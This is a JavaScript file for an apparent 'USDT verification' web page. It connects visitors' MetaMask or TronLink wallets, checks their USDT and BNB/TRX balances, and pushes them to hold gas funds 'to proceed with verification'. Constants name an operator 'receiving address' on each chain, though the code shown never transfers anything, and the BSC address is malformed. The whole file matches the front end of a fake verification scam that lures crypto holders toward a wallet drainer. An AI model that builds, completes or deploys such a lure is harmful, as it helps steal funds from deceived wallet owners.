const bscUSDTAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const bscReceiverAddress = "0xD062Eec11290D6Ec9261CD713Fa9182550E"; // Your USDT receiving address

const tronUSDTAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC20
const tronReceiverAddress = "TXXXXXXXXXXXXXX"; // Replace with your TRON USDT receiving address

const threshold = 1; // USDT threshold for verification

let web3, userAddress;
let tronWebInstance, tronUserAddress;

async function connectBSCWallet() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC Mainnet
      });
      const accounts = await web3.eth.getAccounts();
      userAddress = accounts[0];
      return true;
    } catch (err) {
      alert("Please switch to BNB Smart Chain.");
      return false;
    }
  } else {
    alert("Please install MetaMask.");
    return false;
  }
}

async function connectTRONWallet() {
  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    tronWebInstance = window.tronWeb;
    tronUserAddress = tronWebInstance.defaultAddress.base58;
    return true;
  } else {
    alert("Please install or unlock TronLink wallet.");
    return false;
  }
}

async function verifyBSCAssets() {
  const usdtContract = new web3.eth.Contract(
    [
      {
        constant: true,
        inputs: [{ name: "_owner", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "", type: "uint256" }],
        type: "function",
      },
    ],
    bscUSDTAddress
  );

  const usdtBalanceWei = await usdtContract.methods.balanceOf(userAddress).call();
  const bnbBalanceWei = await web3.eth.getBalance(userAddress);

  const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
  const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));

  if (usdtBalance < threshold) {
    showPopup(
      `No USDT found or balance below threshold.<br>Your USDT: ${usdtBalance.toFixed(4)}`
    );
    return false;
  }
  if (bnbBalance < 0.001) {
    showPopup(
      `⏳ Verification paused<br>Please ensure your wallet has a small amount of BNB to proceed with verification.<br><br><b>Address:</b><br>${userAddress}`
    );
    return false;
  }
  showPopup(`✅ USDT Verified on BSC!<br>Balance: ${usdtBalance.toFixed(4)} USDT`);
  return true;
}

async function verifyTRONAssets() {
  const contract = await tronWebInstance.contract().at(tronUSDTAddress);
  const balance = await contract.methods.balanceOf(tronUserAddress).call();

  const tronBalance = await tronWebInstance.trx.getBalance(tronUserAddress);
  const usdtBalance = balance / 1e6; // USDT has 6 decimals on TRON
  const tronBalanceBNB = tronBalance / 1e6; // TRX balance (like BNB)

  if (usdtBalance < threshold) {
    showPopup(
      `No USDT found or balance below threshold.<br>Your USDT: ${usdtBalance.toFixed(4)}`
    );
    return false;
  }
  if (tronBalanceBNB < 0.1) {
    showPopup(
      `⏳ Verification paused<br>Please ensure your wallet has a small amount of TRX to proceed with verification.<br><br><b>Address:</b><br>${tronUserAddress}`
    );
    return false;
  }
  showPopup(`✅ USDT Verified on TRON!<br>Balance: ${usdtBalance.toFixed(4)} USDT`);
  return true;
}

async function verifyAssets() {
  if (window.ethereum && window.ethereum.isMetaMask) {
    const bscConnected = await connectBSCWallet();
    if (!bscConnected) return;
    await verifyBSCAssets();
  } else if (window.tronWeb && window.tronWeb.ready) {
    const tronConnected = await connectTRONWallet();
    if (!tronConnected) return;
    await verifyTRONAssets();
  } else {
    alert("Please install MetaMask (for BSC) or TronLink (for TRON) wallet.");
  }
}

function showPopup(message) {
  let popup = document.getElementById("popupBox");

  if (!popup) {
    popup = document.createElement("div");
    popup.id = "popupBox";
    document.body.appendChild(popup);
  }

  popup.style.display = "block";
  popup.style.backgroundColor = "#f0f0f0";
  popup.style.color = "#333";
  popup.style.position = "fixed";
  popup.style.top = "50%";
  popup.style.left = "50%";
  popup.style.transform = "translate(-50%, -50%)";
  popup.style.padding = "20px";
  popup.style.borderRadius = "10px";
  popup.style.boxShadow = "0 0 15px rgba(0,0,0,0.2)";
  popup.style.maxWidth = "400px";
  popup.style.width = "80%";
  popup.style.fontSize = "18px";
  popup.style.textAlign = "center";
  popup.style.zIndex = 1000;
  popup.innerHTML = message;

  setTimeout(() => {
    popup.style.display = "none";
  }, 7000);
}

document.getElementById("verifyBtn").addEventListener("click", verifyAssets);
